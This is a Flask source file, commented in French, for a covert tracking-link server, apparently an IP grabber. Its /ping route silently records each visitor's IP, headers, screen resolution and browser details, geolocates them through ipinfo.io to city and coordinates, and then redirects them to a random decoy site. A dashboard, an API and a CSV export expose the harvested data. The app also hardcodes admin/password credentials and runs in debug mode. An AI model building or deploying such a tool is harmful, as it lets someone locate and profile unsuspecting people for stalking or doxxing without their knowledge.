from flask import Flask, request, redirect, render_template, session, url_for, flash, send_file
from flask_sqlalchemy import SQLAlchemy
import requests
import datetime
import io
import csv
import os
import random

app = Flask(__name__)
app.secret_key = os.urandom(24)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///visits.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

IPINFO_TOKEN = ""  # Ta clé ipinfo si tu en as une

REDIRECT_URLS = [
    "https://example1.com",
    "https://example2.com",
    "https://example3.com",
    "https://example4.com",
    "https://example5.com",
    "https://example6.com",
    "https://example7.com",
    "https://example8.com",
    "https://example9.com",
    "https://example10.com",
]

class Visit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    accept_language = db.Column(db.String(100))
    referer = db.Column(db.String(300))
    method = db.Column(db.String(10))
    full_url = db.Column(db.String(500))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    country = db.Column(db.String(10))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    timezone = db.Column(db.String(100))
    org = db.Column(db.String(200))
    screen_resolution = db.Column(db.String(50))
    local_time = db.Column(db.String(50))
    precise_browser = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime)

USERNAME = "admin"
PASSWORD = "password"

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('username') == USERNAME and request.form.get('password') == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            flash("Identifiants incorrects", "danger")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def index():
    return '✅ Serveur actif - Accès non autorisé 😶‍🌫️'

@app.route('/ping', methods=['GET', 'POST'])
def ping():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    headers = dict(request.headers)
    user_agent = headers.get('User-Agent')
    accept_language = headers.get('Accept-Language')
    referer = headers.get('Referer')
    method = request.method
    full_url = request.url

    screen_resolution = None
    local_time = None
    precise_browser = None

    if request.method == 'POST' and request.is_json:
        data = request.get_json()
        screen_resolution = data.get('screen_resolution')
        local_time = data.get('local_time')
        precise_browser = data.get('precise_browser')

    city = region = country = latitude = longitude = timezone = org = None
    try:
        url = f"https://ipinfo.io/{ip}/json"
        if IPINFO_TOKEN:
            url += f"?token={IPINFO_TOKEN}"
        geo = requests.get(url, timeout=5).json()
        city = geo.get('city')
        region = geo.get('region')
        country = geo.get('country')
        loc = geo.get('loc')
        if loc:
            latitude, longitude = loc.split(',')
        timezone = geo.get('timezone')
        org = geo.get('org')
    except:
        pass

    visit = Visit(
        ip=ip,
        user_agent=user_agent,
        accept_language=accept_language,
        referer=referer,
        method=method,
        full_url=full_url,
        city=city,
        region=region,
        country=country,
        latitude=latitude,
        longitude=longitude,
        timezone=timezone,
        org=org,
        screen_resolution=screen_resolution,
        local_time=local_time,
        precise_browser=precise_browser,
        timestamp=datetime.datetime.now()
    )
    db.session.add(visit)
    db.session.commit()

    print(f"Nouvelle visite: {ip} {city} {region} {country}")

    redirect_url = random.choice(REDIRECT_URLS)
    return redirect(redirect_url)

@app.route('/dashboard')
@login_required
def dashboard():
    visits = Visit.query.order_by(Visit.timestamp.desc()).limit(200).all()

    visits_data = []
    for v in visits:
        visits_data.append({
            "id": v.id,
            "timestamp": v.timestamp.strftime("%Y-%m-%d %H:%M:%S") if v.timestamp else None,
            "ip": v.ip,
            "user_agent": v.user_agent,
            "accept_language": v.accept_language,
            "referer": v.referer,
            "method": v.method,
            "full_url": v.full_url,
            "city": v.city,
            "region": v.region,
            "country": v.country,
            "latitude": v.latitude,
            "longitude": v.longitude,
            "timezone": v.timezone,
            "org": v.org,
            "screen_resolution": v.screen_resolution,
            "local_time": v.local_time,
            "precise_browser": v.precise_browser,
        })

    return render_template('dashboard.html', visits=visits, visits_json=visits_data)

@app.route('/api/visits')
@login_required
def api_visits():
    visits = Visit.query.order_by(Visit.timestamp.desc()).limit(200).all()
    visits_data = []
    for v in visits:
        visits_data.append({
            "id": v.id,
            "timestamp": v.timestamp.strftime("%Y-%m-%d %H:%M:%S") if v.timestamp else None,
            "ip": v.ip,
            "user_agent": v.user_agent,
            "accept_language": v.accept_language,
            "referer": v.referer,
            "method": v.method,
            "full_url": v.full_url,
            "city": v.city,
            "region": v.region,
            "country": v.country,
            "latitude": v.latitude,
            "longitude": v.longitude,
            "timezone": v.timezone,
            "org": v.org,
            "screen_resolution": v.screen_resolution,
            "local_time": v.local_time,
            "precise_browser": v.precise_browser,
        })
    return {"visits": visits_data}

@app.route('/export')
@login_required
def export():
    visits = Visit.query.order_by(Visit.timestamp.desc()).all()
    si = io.StringIO()
    cw = csv.writer(si)
    cw.writerow(['Timestamp', 'IP', 'User-Agent', 'Accept-Language', 'Referer', 'Method', 'URL',
                 'City', 'Region', 'Country', 'Latitude', 'Longitude', 'Timezone', 'Org',
                 'Screen Resolution', 'Local Time', 'Precise Browser'])
    for v in visits:
        cw.writerow([v.timestamp, v.ip, v.user_agent, v.accept_language, v.referer, v.method, v.full_url,
                     v.city, v.region, v.country, v.latitude, v.longitude, v.timezone, v.org,
                     v.screen_resolution, v.local_time, v.precise_browser])
    output = io.BytesIO()
    output.write(si.getvalue().encode('utf-8'))
    output.seek(0)
    return send_file(output, mimetype='text/csv', download_name='visits.csv', as_attachment=True)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True)
